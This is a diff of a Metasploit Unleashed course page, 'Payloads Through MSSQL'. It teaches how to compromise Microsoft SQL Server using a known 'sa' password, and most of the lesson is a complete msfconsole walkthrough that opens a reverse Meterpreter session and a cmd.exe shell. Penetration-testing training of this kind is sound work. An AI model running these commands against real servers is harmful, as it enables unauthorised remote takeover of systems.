@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Payloads Through MSSQL - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Payloads_Through_MSSQL" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Payloads_Through_MSSQL&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Payloads_Through_MSSQL&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Payloads_Through_MSSQL&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,208 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Payloads Through MSSQL</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Payloads_Through_MSSQL#column-one">navigation</a>, <a href="Payloads_Through_MSSQL#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>In the previous section, we created a very basic module to get a better understanding of the principales behind a build. This section briefly explains passing payloads using the MSSQL module. The code presented currently works on the following installations of Microsoft's SQL server which are 2000, 2005 and 2008. We will first walkthrough the code and explain how this attack vector works before making our own from the ground up.
+<br />
+<br />
+When an administrator first installs MSSQL they have the option of using either mixed mode authentication or SQL based authentication. Using the latter, a password for the 'sa' account must be specified by the administrator. The 'sa' account is the systems administrator for the SQL server and has most, if not all, permissions on the system. Guessing this password, either using social engineering or other means, one can leverage this attack vector using Metasploit and perform additional actions. In a previous module, we discussed discovering which TCP port MSSQL is using by querying UDP port 1434 and executing dictionary attacks for guess the 'sa' password.
+<br />
+<br />
+For our purposes, we'll assume we are aware of the SQL system administrator's account password. If you wish to recreate this attack, you will need to have a working copy of Microsoft Windows as well as any of the previously mentioned versions of MSSQL.
+<br />
+<br />
+Let's launch the attack:
+<br />
+<br />
+<pre>
+msf > <span style='color:#13C16A;'>use windows/mssql/mssql_payload</span>
+msf exploit(<span style='color:#ff0000;'>mssql_payload</span>) > <span style='color:#13C16A;'>set payload windows/meterpreter/reverse_tcp</span>
+payload => windows/meterpreter/reverse_tcp
+msf exploit(<span style='color:#ff0000;'>mssql_payload</span>) > <span style='color:#13C16A;'>set LHOST 10.10.1.103</span>
+LHOST => 10.10.1.103
+msf exploit(<span style='color:#ff0000;'>mssql_payload</span>) > <span style='color:#13C16A;'>set RHOST 172.16.153.129</span>
+RHOST => 172.16.153.129
+msf exploit(<span style='color:#ff0000;'>mssql_payload</span>) > <span style='color:#13C16A;'>set LPORT 8080</span>
+LPORT => 8080
+msf exploit(<span style='color:#ff0000;'>mssql_payload</span>) > <span style='color:#13C16A;'>set MSSQL_PASS ihazpassword</span>
+MSSQL_PASS => ihazpassword
+msf exploit(<span style='color:#ff0000;'>mssql_payload</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Started reverse handler on port 8080
+<span style='color:#0000FF;'>[*]</span> Warning: This module will leave QiRYOlUK.exe in the SQL Server %TEMP% directory
+<span style='color:#0000FF;'>[*]</span> Writing the debug.com loader to the disk...
+<span style='color:#0000FF;'>[*]</span> Converting the debug script to an executable...
+<span style='color:#0000FF;'>[*]</span> Uploading the payload, please be patient...
+<span style='color:#0000FF;'>[*]</span> Converting the encoded payload...
+<span style='color:#0000FF;'>[*]</span> Executing the payload...
+<span style='color:#0000FF;'>[*]</span> Sending stage (719360 bytes)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (10.10.1.103:8080 -> 10.10.1.103:47384)
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>execute -f cmd.exe -i</span>
+Process 3740 created.
+Channel 1 created.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32></pre>
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Extended_Usage" title="MSF Extended Usage">MSF Extended Usage</a> &gt; <a href="Building_A_Module" title="Building A Module">Building A Module</a> &gt; Payloads Through MSSQL</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Payloads Through MSSQL</strong> &#124; <a href="Creating_Our_Auxiliary_Module" title="Creating Our Auxiliary Module">Creating Our Auxiliary Module</a> &#124; <a href="The_Guts_Behind_It" title="The Guts Behind It">The Guts Behind It</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 494/1000000
+Preprocessor generated node count: 2597/1000000
+Post‐expand include size: 4328/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:113-0!*!0!*!*!*!* and timestamp 20131123142042 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Payloads_Through_MSSQL&amp;oldid=1432">http://www.offensive-security.com/w/index.php?title=Payloads_Through_MSSQL&amp;oldid=1432</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Building_A_Module&amp;action=edit&amp;redlink=1" class="new" title="Category:Building A Module (page does not exist)">Building A Module</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +693,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.131 secs. --></body></html>
